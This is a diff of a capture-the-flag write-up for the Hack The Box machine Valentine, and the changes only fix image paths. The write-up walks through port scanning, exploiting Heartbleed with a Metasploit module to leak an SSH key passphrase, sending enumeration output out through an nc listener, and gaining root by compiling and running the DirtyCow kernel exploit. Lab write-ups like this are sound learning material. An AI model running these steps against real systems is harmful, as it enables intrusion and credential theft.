@@ -8,34 +8,34 @@
 ```
 nmap -sV 10.10.10.79
 ```
-![](/images/2.png)
+![](./images/2.png)
 
 ```
 curl -i 10.10.10.79
 ```
-![](/images/3.png)
+![](./images/3.png)
 
 Opening the web page on a browser, we find only an image...
-![](/images/4.png)
+![](./images/4.png)
 
 
 ```
 dirb http://10.10.10.79/ /usr/share/dirb/wordlists/common.txt
 ```
-![](/images/5.png)
+![](./images/5.png)
 
 
 `/cgi-bin/` and `/server-status` are unauthorized
 
 `/dev` has 2 files, `notes` and `hype_key`
-![](/images/6.png)
-![](/images/7.png)
-![](/images/8.png)
+![](./images/6.png)
+![](./images/7.png)
+![](./images/8.png)
 
 `/endode` and `/decode` are base64 encoder and decoder
-![](/images/9.png)
-![](/images/10.png)
-![](/images/11.png)
+![](./images/9.png)
+![](./images/10.png)
+![](./images/11.png)
 
 
 ## hype_key:
@@ -88,26 +88,26 @@ RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 
 ## SSH
 
-![](/images/12.png)
+![](./images/12.png)
 we found ssh open port in the scan before, so trying to connect using user `hype`, since the file's name was `hype_key`:
 
-![](/images/13.png)
+![](./images/13.png)
 
 The key needs a passphrase...
 Tried to use keywords from the `notes` file, but nothing worked... after being stuck there I tried to review the pieces I had collected, since nothing else came in mind.
 
 ## HeartBleed
 
-![](/images/14.jpg)
+![](./images/14.jpg)
 Machine name is Valentine, `omg.jpg` has a heart which looks like the logo of the **HeartBleed** vulnerability, worth a look!
-![](/images/15.png)
+![](./images/15.png)
 
 ### Testing it..
 
 ```
 nmap -sV -p 443 --script=ssl-heartbleed 10.10.10.79
 ```
-![](/images/16.png)
+![](./images/16.png)
 **Vulnerable**
 
 ### Exploiting it..
@@ -119,22 +119,22 @@ set verbose true
 set rhosts 10.10.10.79
 run
 ```
-![](/images/17.png)
+![](./images/17.png)
 
 there's a `$text` containing some potential base64!
-![](/images/18.png)
+![](./images/18.png)
 
 decoding it:
 
 `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`
 `heartbleedbelievethehype`
-![](/images/19.png)
+![](./images/19.png)
 
 ### Back to SSH
 
 let's try it as the pass phrase for the ssh key :D
-![](/images/20.png)
-![](/images/21.png)
+![](./images/20.png)
+![](./images/21.png)
 
 **WE HAVE USER**
 
@@ -142,12 +142,12 @@ let's try it as the pass phrase for the ssh key :D
 
 let's bring in the `LinEnum` script from https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 I downloaded it, put it on my localhost and downloaded it on the box. And redirecting the output to my local machine for connection-related issues: I opened an nc listener on another terminal.
-![](/images/22.png)
-![](/images/23.png)
+![](./images/22.png)
+![](./images/23.png)
 
 We find an old linux kernel: `3.2.0`
 and old System: `Ubuntu 12.04 LTS`
-![](/images/24.png)
+![](./images/24.png)
 
 ### DirtyCow
 
@@ -155,7 +155,7 @@ one of the privesc exploits worth looking at is **DirtyCow**..
 ```
 searchsploit "dirty cow"
 ```
-![](/images/25.png)
+![](./images/25.png)
 
 It does meet the requirements... I'll use Firefart's exploit since it takes care of adding a new sudoer easily to the passwd.
 https://github.com/FireFart/dirtycow/blob/master/dirty.c
@@ -163,10 +163,10 @@ https://github.com/FireFart/dirtycow/blob/master/dirty.c
 ```
 gcc -pthread dirty.c -o dirty -lcrypt
 ```
-![](/images/26.png)
+![](./images/26.png)
 
 
 run the script using "./dirty" or "./dirty new_password"
-![](/images/27.png)
+![](./images/27.png)
 
 login as `firefart` .. :D
